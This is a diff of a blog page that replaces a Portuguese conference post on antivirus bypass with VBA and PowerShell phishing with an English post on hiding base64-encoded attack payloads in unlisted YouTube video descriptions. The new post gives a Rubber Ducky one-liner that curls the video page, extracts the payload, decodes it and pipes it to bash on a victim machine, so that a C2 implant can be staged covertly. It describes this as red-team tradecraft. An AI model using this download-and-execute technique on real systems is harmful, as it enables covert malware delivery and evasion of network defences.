@@ -31,11 +31,11 @@
     <article class="post">
 
         <header class="post-header">
-            <h1 class="post-title">BWCON 2017[pt-BR]</h1>
+            <h1 class="post-title">Hosting payloads on Youtube</h1>
             <section class="post-meta">
-                <time class="post-date" datetime="2017-10-07">07 Oct 2017</time>
+                <time class="post-date" datetime="2018-12-14">14 Dec 2018</time>
                 
-                    on Conference
+                    on RCE
                 
             </section>
         </header>
@@ -49,35 +49,30 @@
         </header> -->
 
         <!-- <span class="post-meta">
-            <time datetime="2017-10-07">07 Oct 2017</time>
+            <time datetime="2018-12-14">14 Dec 2018</time>
             
-                on Conference
+                on RCE
             
         </span> -->
 
-        <!-- <h1 class="post-title">BWCON 2017[pt-BR]</h1> -->
+        <!-- <h1 class="post-title">Hosting payloads on Youtube</h1> -->
 
         <section class="post-content">
-            <h4 id="bwcon-2017---phishing-a-sh3ll">BWCON 2017 - Phishing a Sh3ll</h4>
-<p>Esse ano pela primeira vez fui para Recife, e palestrei na BWCON evento organizado pelo mestre @Toronto com patrocínio da Tempest e da El Pescador, um evento sinistro, galera com alto nível técnico.
-Minha talk foi sobre Bypass de AV com VBA + Powershell, uma parada simples, mas que pode salvar ai em alguns projetos onde a única porta de entrada para a rede do cliente vai ser o phishing.
-Vou deixar aqui então o link do ppt(Gdrive) e os videos da PoC.</p>
+            <h4 id="why-that">Why that?</h4>
+<p>It’s a trick created during a red team mission, where we have a rubber ducky, which will download a bash script to run the <a href="https://github.com/mthbernardes/GTRS">GTRS</a> on the victm machine, but we have problem, the traffic with the C2 will be safe using the <a href="https://github.com/mthbernardes/GTRS">GTRS</a>, but the infected machine need to talk directly to the C2 to get our payload, so we had the idea to use Youtube to host our bash payload.</p>
 
-<h5 id="slides">Slides</h5>
-<p><a href="https://docs.google.com/presentation/d/1EPjqhAW1mFn_4bajhlzh76wwjMzjpRjDllUUyb1-DPA/edit?usp=sharing">Phishing a Sh3ll</a></p>
+<h3 id="recipe-of-rataria">Recipe of Rataria</h3>
+<p>First of all, create your payload with powershell, bash, python or whatever language you want, then encode it in base64.</p>
 
-<h5 id="videos-poc">Videos PoC</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base64 payload | tr <span class="nt">-d</span> <span class="s1">'\n'</span>
+</code></pre></div></div>
 
-<p><a href="https://youtu.be/N4aec7kvMB8">Avast Execução Macro</a></p>
+<p>Now upload a video on youtube, make it unlisted and on the video description insert your payload encoded, BUT to make your life easier add a tag at the start and end of the payload, like this, <code class="highlighter-rouge">sCmD[YOUPAYLOAD]eCmD</code>, and that’s all, now all you need is execute this command on your rubber ducky payload</p>
 
-<p><a href="https://youtu.be/JWAkj7enkCI">Avast Execução Schedtask</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://www.youtube.com/watch?v<span class="o">=</span>VIDEOID | sed <span class="nt">-n</span> <span class="s1">'s/.*sCmD\(.*\)eCmD.*/\1/p'</span> | base64 <span class="nt">-d</span> | bash
+</code></pre></div></div>
 
-<p><a href="https://youtu.be/brJ9Bke0YFY">AVG Execução Macro</a></p>
-
-<p><a href="https://youtu.be/nGP7RS9WJ4I">AVG Execução Schedtask</a></p>
-
-<h5 id="greatz">Greatz</h5>
-<p>Queria aproveitar e agradecer ao mestre @Toronto pela oportunidade, e a Conviso empresa que trabalho que proporcionou minha ida e estadia em Recife.</p>
+<p>A tip to shrink the url, is use <a href="https://bit.ly">bit.ly</a> which is used by twitter.</p>
 
         </section>
 
@@ -103,15 +98,15 @@ Vou deixar aqui então o link do ppt(Gdrive) e os videos da PoC.</p>
             <!-- Share links section -->
             <section class="share">
     <h4>Share this post</h4>
-    <a class="icon-twitter" href="http://twitter.com/share?text=BWCON 2017[pt-BR]&amp;url=mthbernardes.github.io/conference/2017/10/07/BWCON-2017.html"
+    <a class="icon-twitter" href="http://twitter.com/share?text=Hosting payloads on Youtube&amp;url=mthbernardes.github.io/rce/2018/12/14/hosting-payloads-on-youtube.html"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
         <span class="hidden">Twitter</span>
     </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/conference/2017/10/07/BWCON-2017.html"
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/rce/2018/12/14/hosting-payloads-on-youtube.html"
         onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
         <span class="hidden">Facebook</span>
     </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/conference/2017/10/07/BWCON-2017.html"
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/rce/2018/12/14/hosting-payloads-on-youtube.html"
        onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
         <span class="hidden">Google+</span>
     </a>
